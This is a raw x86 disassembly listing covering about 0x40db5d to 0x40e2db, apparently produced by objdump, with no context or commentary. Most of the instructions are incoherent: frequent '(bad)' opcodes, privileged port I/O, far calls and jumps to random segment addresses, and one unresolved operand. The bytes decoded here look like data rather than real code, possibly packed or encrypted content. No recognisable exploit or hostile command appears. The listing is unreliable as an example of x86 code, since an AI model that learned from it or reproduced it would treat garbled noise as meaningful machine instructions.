  40db5d:	fldcw  WORD PTR [eax+ecx*1]
  40db60:	fist   DWORD PTR ds:0x18d8e7c4
  40db66:	in     al,0x8a
  40db68:	mov    eax,ds:0x9c88fff5
  40db6d:	sub    eax,0x15da42d3
  40db72:	(bad)  
  40db73:	repz fcom DWORD PTR [ebp-0x35]
  40db77:	ret    
  40db78:	(bad)  
  40db79:	(bad)  
  40db7b:	sub    BYTE PTR [ebx],ah
  40db7d:	push   ebx
  40db7e:	stos   DWORD PTR es:[edi],eax
  40db7f:	daa    
  40db80:	jbe    0x40dbd4
  40db82:	stos   DWORD PTR es:[edi],eax
  40db83:	daa    
  40db84:	jbe    0x40dbda
  40db86:	sub    ch,BYTE PTR [eax]
  40db88:	mov    ds:0x5ece95d0,eax
  40db8d:	push   edx
  40db8e:	stos   DWORD PTR es:[edi],eax
  40db8f:	daa    
  40db90:	dec    edx
  40db91:	shl    BYTE PTR [ebp-0x3a],1
  40db94:	add    BYTE PTR [edi-0x66],bl
  40db97:	dec    eax
  40db98:	or     ebp,DWORD PTR [ecx-0x6f]
  40db9b:	fidiv  WORD PTR [ebp-0x708f2ee2]
  40dba1:	adc    DWORD PTR [ecx-0x19],0x5dd06203
  40dba8:	into   
  40dba9:	fs call 0x8772:0x91690b08
  40dbb1:	inc    ecx
  40dbb2:	adc    ecx,ebp
  40dbb4:	add    esp,DWORD PTR [edx+0x42]
  40dbb7:	ret    0x9241
  40dbba:	mov    eax,ds:0x1d41c760
  40dbbf:	jae    0x40db44
  40dbc1:	loope  0x40db9c
  40dbc3:	out    0x3,eax
  40dbc5:	fist   DWORD PTR [ebp+0xb]
  40dbc8:	test   BYTE PTR [ebp-0x60],bl
  40dbcb:	out    0x8e,eax
  40dbcd:	fadd   QWORD PTR [eax-0x19]
  40dbd0:	add    esp,DWORD PTR [edx+0x52]
  40dbd3:	imul   esp,DWORD PTR [eax],0xffffffd6
  40dbd6:	fadd   DWORD PTR [eax]
  40dbd8:	jmp    0x58d2a3e
  40dbdd:	ds push ecx
  40dbdf:	test   ch,cl
  40dbe1:	lods   eax,DWORD PTR ds:[esi]
  40dbe2:	mov    al,ds:0xca8e9fd
  40dbe7:	and    eax,0xd5fe2f9
  40dbec:	pop    esi
  40dbed:	fucomi st,st(4)
  40dbef:	add    cl,ch
  40dbf1:	pop    eax
  40dbf2:	push   ecx
  40dbf3:	xchg   edi,eax
  40dbf4:	retf   
  40dbf5:	popa   
  40dbf6:	fld    DWORD PTR [ecx+0x526000ac]
  40dbfc:	ins    BYTE PTR es:[edi],dx
  40dbfd:	lds    ecx,FWORD PTR [ebp+0x4e]
  40dc00:	push   ebx
  40dc01:	jmp    0x3667:0x6a0a6758
  40dc08:	push   cs
  40dc09:	ins    DWORD PTR es:[edi],dx
  40dc0a:	cmp    ecx,ebx
  40dc0c:	add    cl,ch
  40dc0e:	fsub   QWORD PTR [eax-0x79b2099b]
  40dc14:	(bad)  
  40dc15:	call   0xce38387b
  40dc1a:	int    0x2a
  40dc1c:	xor    BYTE PTR [eax],0xc3
  40dc1f:	sub    ebp,DWORD PTR [edi+0x6a]
  40dc22:	das    
  40dc23:	cmp    BYTE PTR [ebp+esi*8+0x58],dh
  40dc27:	addr16 dec ebx
  40dc29:	call   0xeb844396
  40dc2e:	push   ds
  40dc2f:	mov    ecx,0xdb19f208
  40dc34:	out    0x10,eax
  40dc36:	xor    eax,0xece900dc
  40dc3b:	pop    ebx
  40dc3c:	and    al,0x8d
  40dc3e:	pop    esi
  40dc3f:	fld    DWORD PTR [eax]
  40dc41:	sub    DWORD PTR [esi-0x71d63f16],edx
  40dc47:	add    eax,0xfd7d9dfe
  40dc4c:	(bad)  
  40dc4d:	call   0x10a2eb3
  40dc52:	ins    BYTE PTR es:[edi],dx
  40dc53:	and    dh,BYTE PTR [edx+0xd46724]
  40dc59:	add    ah,dh
  40dc5b:	outs   dx,BYTE PTR ds:[esi]
  40dc5c:	and    DWORD PTR [eax+eax*1+0x4a],ebx
  40dc60:	fild   DWORD PTR [eax]
  40dc62:	dec    DWORD PTR [edi+0x3b015cbe]
  40dc68:	fucomi st,st(0)
  40dc6a:	adc    dh,ch
  40dc6c:	and    edi,edi
  40dc6e:	xor    eax,edx
  40dc70:	xchg   ebp,eax
  40dc71:	cmp    al,cl
  40dc73:	adc    al,0x1f
  40dc75:	ins    DWORD PTR es:[edi],dx
  40dc76:	and    bl,bh
  40dc78:	fiadd  DWORD PTR [ebx+0x3bcfffc0]
  40dc7e:	push   ds
  40dc7f:	xchg   DWORD PTR [ebx],esp
  40dc81:	dec    DWORD PTR [edi]
  40dc83:	jle    0x40dc54
  40dc85:	and    al,BYTE PTR [eax]
  40dc87:	sti    
  40dc88:	xlat   BYTE PTR ds:[ebx]
  40dc89:	ins    BYTE PTR es:[edi],dx
  40dc8a:	and    al,0x67
  40dc8c:	sub    al,0xd4
  40dc8e:	add    cl,bl
  40dc90:	fimul  DWORD PTR ds:0xe9eeeb6
  40dc96:	mov    dh,0xfe
  40dc98:	fnstcw WORD PTR [edi-0x2f303c1e]
  40dc9e:	add    ebx,DWORD PTR [ecx-0x21]
  40dca1:	xchg   esp,eax
  40dca2:	and    al,0xf3
  40dca4:	aad    0x0
  40dca6:	add    dh,al
  40dca8:	(bad)  
  40dca9:	mov    DWORD PTR [edi-0x79],eax
  40dcac:	fnsave [eax+edx*4]
  40dcaf:	mov    ah,0x51
  40dcb1:	call   0x9f74:0x87da7b02
  40dcb8:	retf   0xf981
  40dcbb:	out    dx,al
  40dcbc:	rol    DWORD PTR [ebx+0xda897f],cl
  40dcc2:	mov    eax,DWORD PTR [eax]
  40dcc4:	cmp    al,0xed
  40dcc6:	iret   
  40dcc7:	cli    
  40dcc8:	clc    
  40dcc9:	lahf   
  40dcca:	sbb    eax,0x4b3b6200
  40dccf:	mov    BYTE PTR [esi-0x6176d32c],bl
  40dcd5:	int3   
  40dcd6:	and    BYTE PTR [esi-0x6f],bh
  40dcd9:	sub    esi,DWORD PTR [ebp-0x76]
  40dcdc:	dec    ebx
  40dcdd:	mov    bh,0xaf
  40dcdf:	or     eax,0xc32665
  40dce4:	and    edx,DWORD PTR [ecx+0xc]
  40dce7:	or     ebx,DWORD PTR [edx]
  40dce9:	mov    ebx,0xb36b734b
  40dcee:	lock and ebx,DWORD PTR [edi-0x71e01775]
  40dcf5:	dec    edi
  40dcf6:	mov    DWORD PTR [ebx+0x3e],ebp
  40dcf9:	xchg   esp,eax
  40dcfa:	mov    WORD PTR [ebx+0x46],gs
  40dcfd:	test   BYTE PTR [ebx+ecx*2+0x738a943e],cl
  40dd04:	inc    esi
  40dd05:	enter  0x438b,0x3e
  40dd09:	enter  0xf633,0x99
  40dd0d:	ja     0x40dd30
  40dd0f:	movntq QWORD PTR [ebp+0x2b620003],mm3
  40dd16:	push   ebp
  40dd17:	cmp    bl,BYTE PTR ds:0xef5cf2c8
  40dd1d:	ja     0x40dd22
  40dd1f:	mov    DWORD PTR [esi],esp
  40dd21:	aam    0x1c
  40dd23:	sub    edx,DWORD PTR ds:0x538a8c
  40dd29:	jle    0x40dcb7
  40dd2b:	xchg   BYTE PTR [ecx+0x60],al
  40dd2e:	pusha  
  40dd2f:	sar    dh,cl
  40dd31:	outs   dx,DWORD PTR ds:[esi]
  40dd32:	sbb    al,0x10
  40dd34:	inc    eax
  40dd35:	bound  edi,QWORD PTR [ecx-0x26]
  40dd38:	test   BYTE PTR [edx+0x168b3024],ah
  40dd3e:	mov    WORD PTR ds:0x8b9ac0f,fs
  40dd44:	mov    dh,0x20
  40dd46:	fld1   
  40dd48:	inc    edx
  40dd49:	adc    al,0xf2
  40dd4c:	dec    ebx
  40dd4d:	pusha  
  40dd4e:	xchg   edx,eax
  40dd4f:	adc    cl,BYTE PTR [eax+0x3e91181]
  40dd55:	bound  ebx,QWORD PTR [esi]
  40dd57:	hlt    
  40dd58:	mov    WORD PTR [ebp+ecx*8-0x3315d000],ds
  40dd5f:	fs jae 0x40ddc4
  40dd62:	(bad)  
  40dd64:	mov    dh,BYTE PTR [ecx-0x72c3080b]
  40dd6a:	icebp  
  40dd6b:	adc    eax,0xcc0de902
  40dd70:	sbb    ecx,DWORD PTR [ecx]
  40dd72:	push   0xf541c762
  40dd77:	jb     0x40dd38
  40dd79:	inc    ecx
  40dd7a:	icebp  
  40dd7b:	sub    BYTE PTR [ebx+0x3ccbf5a9],cl
  40dd81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd82:	stc    
  40dd83:	fiadd  WORD PTR [esi+0x3e7daa9]
  40dd89:	xlat   BYTE PTR ds:[ebx]
  40dd8a:	adc    edx,ebp
  40dd8c:	mov    al,BYTE PTR [eax]
  40dd8e:	sub    ebp,esi
  40dd90:	add    eax,DWORD PTR ds:0xbf60f51d
  40dd96:	xor    ecx,0x963436a
  40dd9c:	cdq    
  40dd9d:	js     0x40ddf5
  40dd9f:	sub    eax,0x1b5c3de
  40dda4:	xchg   ecx,eax
  40dda5:	jle    0x40dd94
  40dda7:	int3   
  40dda8:	ins    BYTE PTR es:[edi],dx
  40dda9:	call   0xf521:0x8ce7d962
  40ddb0:	mov    edi,0xded1cc08
  40ddb5:	mov    cl,0x4d
  40ddb7:	fisubr DWORD PTR [eax]
  40ddb9:	bound  ebx,QWORD PTR [ebp-0x30]
  40ddbc:	das    
  40ddbd:	add    al,0xab
  40ddbf:	loopne 0x40ddc1
  40ddc1:	gs push ebp
  40ddc3:	adc    DWORD PTR [eax],eax
  40ddc5:	jmp    0x724dfc2b
  40ddca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddcb:	shl    BYTE PTR [edi],1
  40ddcd:	adc    eax,0x688bcaee
  40ddd2:	pop    edi
  40ddd3:	fld    DWORD PTR [eax]
  40ddd5:	bound  esp,QWORD PTR [edx]
  40ddd7:	clc    
  40ddd8:	and    al,0x29
  40ddda:	xlat   BYTE PTR ds:[ebx]
  40dddb:	daa    
  40dddc:	and    eax,0x2517eed9
  40dde1:	or     eax,0xde211479
  40dde6:	(bad)  
  40dde8:	(bad)  
  40dde9:	call   0xc5852e4f
  40ddee:	dec    ecx
  40ddef:	push   eax
  40ddf0:	dec    esp
  40ddf1:	int    0x0
  40ddf3:	cmp    eax,0x8d629bb0
  40ddf8:	dec    eax
  40ddf9:	add    cl,ch
  40ddfb:	popa   
  40ddfc:	push   esi
  40ddfd:	shr    dh,0x7d
  40de00:	out    dx,eax
  40de01:	(bad)  
  40de02:	jbe    0x40de71
  40de04:	retf   
  40de05:	mov    dh,0x14
  40de07:	(bad)  
  40de08:	int3   
  40de09:	mov    dh,0xac
  40de0b:	bound  ebx,QWORD PTR [edx-0x76970e1e]
  40de11:	xchg   DWORD PTR [ebp+0x537fed75],edi
  40de17:	push   ebp
  40de18:	fwait
  40de19:	add    cl,ch
  40de1b:	pop    esp
  40de1c:	push   ebp
  40de1d:	ss call 0x6ecab784
  40de23:	rcr    BYTE PTR [ebx+0x968e9fd],cl
  40de29:	add    eax,0xfff325f6
  40de2e:	call   0xcdb53094
  40de33:	jno    0x40de8d
  40de35:	test   DWORD PTR [esi+0x95664],0x8300d77a
  40de3f:	cld    
  40de40:	test   DWORD PTR [eax],0x89efd48b
  40de46:	mov    BYTE PTR [edx],0x89
  40de49:	and    DWORD PTR [eax],ebp
  40de4b:	repnz pop ebx
  40de4d:	and    DWORD PTR [edi*4+0x677489e4],esp
  40de54:	icebp  
  40de55:	mov    eax,ebp
  40de57:	add    BYTE PTR [ebp*2-0x673af0f9],ch
  40de5e:	add    cl,al
  40de60:	sub    cl,bh
  40de62:	or     eax,ecx
  40de64:	xor    BYTE PTR ds:0x8c380972,dl
  40de6a:	and    DWORD PTR [ebp+0x40],eax
  40de6d:	mov    ah,0x1d
  40de6f:	jl     0x40de55
  40de71:	dec    ebp
  40de72:	imul   esp,DWORD PTR [edi+eiz*1],0xff246950
  40de79:	dec    edi
  40de7a:	inc    ecx
  40de7b:	and    al,0x17
  40de7d:	dec    esi
  40de7e:	push   ecx
  40de7f:	and    al,0x13
  40de81:	call   0xf5851a7c
  40de86:	or     eax,0xd63d8d
  40de8b:	add    BYTE PTR [eax+0x10],dh
  40de8e:	cmp    edx,DWORD PTR [edi+0x73]
  40de91:	stos   DWORD PTR es:[edi],eax
  40de92:	push   ebp
  40de93:	or     DWORD PTR [ecx+0x675487d8],0xffffffbd
  40de9a:	sub    DWORD PTR [edi+0x57],ecx
  40de9d:	dec    esp
  40de9e:	dec    ecx
  40de9f:	and    al,0x6f
  40dea1:	push   eax
  40dea2:	inc    eax
  40dea3:	add    bl,bl
  40dea5:	mov    dh,bh
  40dea7:	adc    eax,0x40ccef
  40deac:	mov    ds:0xf6c0847d,al
  40deb1:	in     eax,0x89
  40deb3:	dec    esp
  40deb4:	bound  ecx,QWORD PTR [ebp+eiz*1+0x6b1d40f]
  40debb:	mov    dh,0x0
  40debd:	xor    esi,DWORD PTR [ecx-0x589520bc]
  40dec3:	push   ecx
  40dec4:	mov    bl,ch
  40dec6:	cld    
  40dec7:	add    DWORD PTR [eax],eax
  40dec9:	bound  edx,QWORD PTR [edi-0x6992fc2f]
  40decf:	pop    ss
  40ded0:	shl    BYTE PTR [eax+0x7223d129],cl
  40ded6:	mov    bl,0x7e
  40ded8:	test   DWORD PTR [edx-0x50],esp
  40dedb:	add    DWORD PTR [ebx+0x3b1cccae],ecx
  40dee1:	lods   eax,DWORD PTR ds:[esi]
  40dee2:	enter  0xb6eb,0xe9
  40dee6:	jmp    0x40df08
  40dee8:	and    al,0xd9
  40deea:	ret    
  40deeb:	and    BYTE PTR [eax],ch
  40deed:	mov    ds:0x4623c129,al
  40def2:	mov    bh,0xbc
  40def4:	pop    ds
  40def5:	xchg   edi,eax
  40def6:	fld    QWORD PTR [ebp-0x36c69fb7]
  40defc:	and    esi,DWORD PTR [esi]
  40defe:	scas   eax,DWORD PTR es:[edi]
  40deff:	int3   
  40df00:	and    ebp,ebx
  40df02:	ret    
  40df03:	and    BYTE PTR [eax],ch
  40df05:	out    0xed,eax
  40df07:	add    dl,BYTE PTR [eax-0x6d]
  40df0a:	sub    ecx,DWORD PTR [esi]
  40df0c:	ins    BYTE PTR es:[edi],dx
  40df0d:	dec    esp
  40df0e:	jo     0x40df11
  40df10:	pop    ecx
  40df11:	cmp    esi,DWORD PTR ds:0x378c7445
  40df17:	shl    DWORD PTR [ebx],1
  40df19:	jp     0x40df96
  40df1b:	stos   DWORD PTR es:[edi],eax
  40df1c:	add    DWORD PTR [ebp+0x1a],edx
  40df1f:	retf   
  40df20:	add    BYTE PTR [eax],al
  40df22:	mov    ds:0xaa0b0d0f,eax
  40df27:	ss jl  0x40debd
  40df2a:	bound  esi,QWORD PTR [eax-0x26e5d4ff]
  40df30:	jmp    0x40df9e
  40df32:	mov    edx,0xeac330bd
  40df37:	or     al,0xcc
  40df39:	adc    edx,DWORD PTR [edi]
  40df3b:	icebp  
  40df3c:	(bad)  
  40df3d:	rol    BYTE PTR [ecx-0xb],0x72
  40df41:	enter  0xed41,0xa7
  40df45:	mov    ah,BYTE PTR [ecx]
  40df47:	cmc    
  40df48:	retf   
  40df49:	cmp    BYTE PTR ds:0x54b16bf9,ah
  40df4f:	arpl   WORD PTR [ebx+eax*1],si
  40df52:	ins    DWORD PTR es:[edi],dx
  40df53:	dec    edi
  40df54:	and    al,0x2
  40df56:	and    edi,DWORD PTR [ebx-0x21]
  40df59:	or     BYTE PTR [edx],bl
  40df5b:	test   ecx,esp
  40df5d:	xor    BYTE PTR [edx],ah
  40df5f:	sbb    dh,BYTE PTR [ecx-0x41]
  40df62:	sub    ecx,0xdc9b0151
  40df68:	rol    BYTE PTR [eax+0x3d7bda9],0x55
  40df6f:	pop    esi
  40df70:	dec    eax
  40df71:	push   ss
  40df72:	(bad)  
  40df73:	fldenv [edi-0xa]
  40df76:	adc    eax,0xf47fe72d
  40df7b:	mul    bh
  40df7d:	add    edi,ebx
  40df7f:	int3   
  40df80:	jmp    0x36294188
  40df85:	into   
  40df86:	add    BYTE PTR [edx-0x18],ah
  40df89:	cmp    eax,0x899a63be
  40df8e:	or     ebx,DWORD PTR [ecx-0x57]
  40df91:	jo     0x40df1f
  40df93:	loope  0x40df6e
  40df95:	out    0x3,eax
  40df97:	out    0xdd,eax
  40df99:	stc    
  40df9a:	mov    ah,BYTE PTR [ecx]
  40df9c:	mov    ebp,0xed1d38f3
  40dfa1:	ret    
  40dfa2:	or     BYTE PTR [ecx-0x67],dh
  40dfa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfa6:	mov    bl,BYTE PTR [ecx+edx*8]
  40dfa9:	add    BYTE PTR [eax+0x58],al
  40dfac:	fild   DWORD PTR [eax]
  40dfae:	jmp    0x7251ff8d
  40dfb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfb4:	in     al,0x29
  40dfb6:	sub    ebp,edx
  40dfb8:	sub    al,0x25
  40dfba:	std    
  40dfbb:	fcmovu st,st(4)
  40dfbd:	jg     0x40e01f
  40dfbf:	test   DWORD PTR [ecx-0x77],ebp
  40dfc2:	scas   al,BYTE PTR es:[edi]
  40dfc3:	gs fs leave 
  40dfc6:	rcr    BYTE PTR [esi-0x2e5a7800],cl
  40dfcc:	fdiv   QWORD PTR [edi]
  40dfce:	push   ebp
  40dfcf:	inc    ebp
  40dfd0:	and    DWORD PTR [eax],eax
  40dfd2:	jmp    0xbfcec838
  40dfd7:	pop    edi
  40dfd8:	fld    DWORD PTR [eax]
  40dfda:	fs and al,0xda
  40dfdd:	out    0xed,eax
  40dfdf:	pop    esi
  40dfe0:	fld    DWORD PTR [eax]
  40dfe2:	jb     0x40dfe5
  40dfe4:	ins    BYTE PTR es:[edi],dx
  40dfe5:	add    cl,ch
  40dfe7:	popa   
  40dfe8:	pop    esi
  40dfe9:	jmp    0x40dfd1
  40dfeb:	add    ch,ah
  40dfed:	xchg   edx,eax
  40dfee:	push   ds
  40dfef:	jmp    0xedb4b255
  40dff4:	pusha  
  40dff5:	pop    esi
  40dff6:	bnd jmp DWORD PTR [ecx-0x27]
  40dffa:	mov    DWORD PTR [esi+eiz*2],ebp
  40dffd:	bound  eax,QWORD PTR [ebp+0xd95e75]
  40e003:	jb     0x40e030
  40e005:	call   0x299d69c9
  40e00a:	(bad)  
  40e00b:	cld    
  40e00c:	in     eax,dx
  40e00d:	xchg   esi,eax
  40e00e:	jne    0x40dfed
  40e010:	jo     0x40dfff
  40e012:	push   0x8a97a1ff
  40e017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e018:	ins    DWORD PTR es:[edi],dx
  40e019:	fs imul esp,ecx,0x4e
  40e01d:	pop    esp
  40e01e:	and    al,0xb5
  40e020:	pop    esi
  40e021:	fld    DWORD PTR [eax]
  40e023:	add    BYTE PTR [eax],dh
  40e025:	mov    eax,ds:0x21484421
  40e02a:	or     cl,BYTE PTR [ecx+0x150c13f]
  40e030:	mov    ebx,0x8a86e7db
  40e035:	fild   DWORD PTR [eax]
  40e037:	cvtps2pi mm4,QWORD PTR [edx-0x3f007700]
  40e03e:	push   eax
  40e03f:	add    DWORD PTR [ebx-0x25],edi
  40e042:	push   0x2
  40e044:	ret    
  40e045:	fsubp  st(0),st
  40e047:	mov    edi,esp
  40e049:	mov    edi,0x734e91c
  40e04e:	(bad)  
  40e04f:	inc    DWORD PTR [eax]
  40e051:	add    BYTE PTR [ecx+0x21],ah
  40e054:	pop    esp
  40e055:	dec    edx
  40e056:	fild   DWORD PTR [eax]
  40e058:	inc    eax
  40e059:	rcr    BYTE PTR [esi-0x4c74ebdf],cl
  40e05f:	push   ebx
  40e060:	(bad)  
  40e061:	out    dx,eax
  40e062:	mov    esi,0xdb4b015c
  40e067:	mov    edx,DWORD PTR [ebp+0x48]
  40e06a:	mov    ah,0xfe
  40e06c:	mov    ah,0x5f
  40e06e:	test   eax,0xc3b0000
  40e073:	mov    dl,0x24
  40e075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e076:	fadd   QWORD PTR [eax]
  40e078:	add    BYTE PTR [edx+0x16],bl
  40e07b:	retf   
  40e07c:	call   0x3fe58b
  40e081:	sub    dh,dl
  40e083:	inc    eax
  40e084:	cmp    ecx,edx
  40e086:	mov    ?,WORD PTR ds:0xff07023d
  40e08c:	(bad)  
  40e08d:	out    dx,eax
  40e08e:	int    0x83
  40e090:	shr    bh,0x97
  40e093:	cmp    al,0x1e
  40e095:	inc    edi
  40e096:	or     edi,edi
  40e098:	(bad)  
  40e09a:	jecxz  0x40e0ba
  40e09c:	add    BYTE PTR [edx-0x80],ah
  40e09f:	add    dh,BYTE PTR [esi-0x49fd7ee9]
  40e0a5:	daa    
  40e0a6:	add    BYTE PTR [eax+eiz*8+0x6a],0x8b
  40e0ab:	cmp    DWORD PTR [edx],eax
  40e0ad:	mov    ebx,0x11fff100
  40e0b2:	dec    ebp
  40e0b3:	or     al,0x8b
  40e0b5:	add    dh,ch
  40e0b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0b8:	rol    DWORD PTR [eax],0x62
  40e0bb:	cmp    BYTE PTR [esi+0x43],0x46
  40e0bf:	xchg   esp,eax
  40e0c0:	pop    esi
  40e0c1:	pushf  
  40e0c2:	fnstcw WORD PTR [edi]
  40e0c4:	icebp  
  40e0c5:	mov    dh,ah
  40e0c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0c8:	rol    DWORD PTR [eax],0x62
  40e0cb:	sbb    BYTE PTR [esi+0x2],0x31
  40e0cf:	mov    ecx,0x7fe77fc4
  40e0d4:	fmul   DWORD PTR [esi]
  40e0d6:	out    0xac,al
  40e0d8:	and    eax,0x80fc6200
  40e0dd:	and    ebp,DWORD PTR [edx+0x55000181]
  40e0e3:	std    
  40e0e4:	int    0x1d
  40e0e6:	bound  eax,QWORD PTR [eax-0x7e584a00]
  40e0ec:	add    BYTE PTR [esi-0x1fbd7d59],dh
  40e0f2:	pop    edx
  40e0f3:	jnp    0x40e12e
  40e0f5:	add    cl,BYTE PTR [ebx]
  40e0f7:	add    dh,ch
  40e0f9:	push   DWORD PTR [ecx-0x1a75a414]
  40e0ff:	inc    DWORD PTR [eax+eax*1]
  40e102:	(bad)  
  40e103:	stc    
  40e104:	mov    BYTE PTR [ebx],ah
  40e106:	stos   BYTE PTR es:[edi],al
  40e107:	add    DWORD PTR [ecx],0x5260b00
  40e10d:	add    BYTE PTR [edx-0x5],ah
  40e110:	mov    BYTE PTR [ebx],ah
  40e112:	xchg   BYTE PTR [ecx-0x26ddffff],al
  40e118:	jo     0x40e0e2
  40e11a:	add    BYTE PTR [ecx+0x37d9b7ed],al
  40e120:	xchg   esi,eax
  40e121:	fwait
  40e122:	sub    BYTE PTR [esi],ah
  40e124:	fsub   st,st(7)
  40e126:	add    ebp,edi
  40e128:	sub    ebp,ebx
  40e12a:	fdiv   DWORD PTR [esp+ecx*2-0x269d2ffd]
  40e131:	out    0x70,eax
  40e133:	icebp  
  40e134:	mov    esp,0xd962028b
  40e139:	mov    eax,0xb480a87c
  40e13e:	push   0xffffff8c
  40e140:	xchg   ebp,eax
  40e141:	ficom  DWORD PTR [ebp+0x23]
  40e144:	shr    BYTE PTR [ecx],cl
  40e146:	add    esi,esp
  40e148:	push   ss
  40e149:	int    0x3
  40e14b:	(bad)  
  40e14c:	aam    0xe0
  40e14e:	outs   dx,DWORD PTR ds:[esi]
  40e14f:	ins    BYTE PTR es:[edi],dx
  40e150:	xchg   ebp,eax
  40e151:	out    0x87,al
  40e153:	lock mov ebx,0xf59f03e7
  40e159:	jecxz  0x40e1cb
  40e15b:	push   esp
  40e15c:	push   cs
  40e15d:	pop    ds
  40e15e:	das    
  40e15f:	imul   edx,DWORD PTR [ebp-0x2e2e8f2a],0x953e0e0c
  40e169:	(bad)  
  40e16a:	div    DWORD PTR [edx+0x5e]
  40e16d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e16e:	neg    DWORD PTR [eax-0x2a]
  40e171:	aad    0x6f
  40e173:	and    al,0x95
  40e175:	fiadd  WORD PTR [esi+0x3e7f64f]
  40e17b:	gs dec ebx
  40e17d:	sub    al,0x3
  40e17f:	add    BYTE PTR [ebp+0x4b],bl
  40e182:	sub    al,0x6
  40e184:	and    edi,DWORD PTR [ebx-0x21]
  40e187:	cld    
  40e188:	and    eax,0x768390d9
  40e18d:	fst    DWORD PTR [ebx]
  40e18f:	test   DWORD PTR [ebx+0x60],0x193d6500
  40e196:	add    cl,ch
  40e198:	popa   
  40e199:	pusha  
  40e19a:	inc    esp
  40e19b:	or     eax,0xee80807a
  40e1a0:	or     esp,DWORD PTR [esi]
  40e1a2:	add    dh,ah
  40e1a4:	or     ebx,DWORD PTR [esi]
  40e1a6:	add    ebp,DWORD PTR [eax]
  40e1a8:	inc    eax
  40e1a9:	fmul   QWORD PTR [ecx]
  40e1ab:	xor    DWORD PTR [esi-0x7e],ebx
  40e1ae:	cmp    BYTE PTR [ecx+eiz*2-0x22bd8ad3],0x68
  40e1b6:	and    al,0x91
  40e1b8:	pusha  
  40e1b9:	fld    DWORD PTR [eax]
  40e1bb:	neg    ah
  40e1bd:	lods   eax,DWORD PTR ds:[esi]
  40e1be:	and    al,0xe9
  40e1c0:	popa   
  40e1c1:	pop    eax
  40e1c2:	ret    
  40e1c3:	jmp    0x1a18:0xed250008
  40e1ca:	clc    
  40e1cb:	push   es
  40e1cc:	repnz loop 0x40e185
  40e1cf:	lods   al,BYTE PTR ds:[esi]
  40e1d0:	pusha  
  40e1d1:	in     al,0xb6
  40e1d3:	lods   al,BYTE PTR ds:[esi]
  40e1d4:	pop    edi
  40e1d5:	call   0xc029:0x9c5ee1df
  40e1dc:	mov    DWORD PTR [ecx+ebp*2],esi
  40e1df:	out    dx,al
  40e1e0:	jecxz  0x40e25c
  40e1e2:	and    al,0xe9
  40e1e4:	add    BYTE PTR [ecx-0x30],ah
  40e1e7:	pop    ebp
  40e1e8:	push   ecx
  40e1e9:	xor    DWORD PTR [ebx+0x7f462687],ebp
  40e1ef:	ror    BYTE PTR [eax-0x16bb00a6],cl
  40e1f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1f6:	sbb    BYTE PTR ds:0xd53ead9,ah
  40e1fc:	ins    DWORD PTR es:[edi],dx
  40e1fd:	les    edx,FWORD PTR [ebx+0x2388e9fd]
  40e203:	imul   ebx,edx,0x6587d4a1
  40e209:	dec    edx
  40e20a:	imul   eax,DWORD PTR [eax],0xdd80b00
  40e210:	mov    dh,0x46
  40e212:	fiadd  WORD PTR [edi-0x293e87c]
  40e218:	dec    ebx
  40e21a:	push   cs
  40e21b:	inc    edi
  40e21c:	or     al,0x52
  40e21e:	popa   
  40e21f:	and    DWORD PTR [eax-0x74ff2845],ebx
  40e225:	hlt    
  40e226:	mov    bl,0x2a
  40e228:	rol    DWORD PTR [edx+0x61],0x21
  40e22c:	mov    al,ds:0x8b00d7cb
  40e231:	inc    edi
  40e232:	rol    DWORD PTR [eax+0x1],0xbb
  40e236:	xlat   BYTE PTR ds:[ebx]
  40e237:	sub    ecx,eax
  40e239:	add    ah,BYTE PTR [ecx+0x21]
  40e23c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e23d:	mov    edx,edi
  40e23f:	add    BYTE PTR [ecx+0x9cc0ff],cl
  40e245:	jnp    0x40e21e
  40e247:	mov    ebx,eax
  40e249:	add    BYTE PTR [eax-0x5149f0e4],ah
  40e24f:	fld    DWORD PTR [edi-0x290587c]
  40e255:	(bad)  
  40e256:	jnp    0x40e1ea
  40e258:	mov    bl,0x45
  40e25a:	dec    eax
  40e25b:	push   ds
  40e25c:	loope  0x40e266
  40e25e:	push   eax
  40e25f:	iret   
  40e260:	push   cs
  40e261:	mov    dh,0x86
  40e263:	loopne 0x40e1ec
  40e265:	mov    WORD PTR [edi+0x45],ss
  40e268:	std    
  40e269:	dec    DWORD PTR [ebx-0x6c]
  40e26c:	mov    bl,0x4d
  40e26e:	inc    edi
  40e26f:	push   ds
  40e270:	loope  0x40e27a
  40e272:	xor    bh,cl
  40e274:	mov    al,BYTE PTR [edi+edx*2+0xb000055]
  40e27b:	data16 sub al,dl
  40e27e:	(bad)  
  40e280:	mov    BYTE PTR [edi+eiz*1+0x62fffd73],al
  40e287:	cmp    BYTE PTR [edx-0x7a],0xe6
  40e28b:	add    BYTE PTR [ecx],0x0
  40e28e:	jmp    0x40e294
  40e290:	es mov al,0x62
  40e293:	add    BYTE PTR [ecx],0x8b
  40e296:	(bad)  [eax]
  40e298:	add    al,BYTE PTR [eax]
  40e29a:	(bad)  
  40e29b:	stc    
  40e29c:	jge    0x40e2c1
  40e29e:	push   ss
  40e29f:	add    DWORD PTR [ecx],0x2604df00
  40e2a5:	nop
  40e2a6:	bound  eax,QWORD PTR [eax-0x231976ff]
  40e2ac:	mov    eax,0x80b500ff
  40e2b1:	outs   dx,BYTE PTR ds:[esi]
  40e2b2:	push   ebx
  40e2b3:	xchg   BYTE PTR [eax-0x4aa4078],dh
  40e2b9:	adc    al,0x27
  40e2bb:	bound  eax,QWORD PTR [eax-0x28787802]
  40e2c1:	add    al,0x0
  40e2c3:	loope  0x40e282
  40e2c5:	add    ebp,ecx
  40e2c7:	test   dl,ch
  40e2c9:	outs   dx,BYTE PTR ds:[esi]
  40e2ca:	(bad)  
  40e2cb:	jmp    0x639d08cc
  40e2d0:	add    BYTE PTR [ecx],0x40
  40e2d3:	(bad)  [ebp+eiz*1+0x14]
  40e2d7:	fld    TBYTE PTR [ebp+eiz*1+0x10]
  40e2db:	jmp    0x40e318
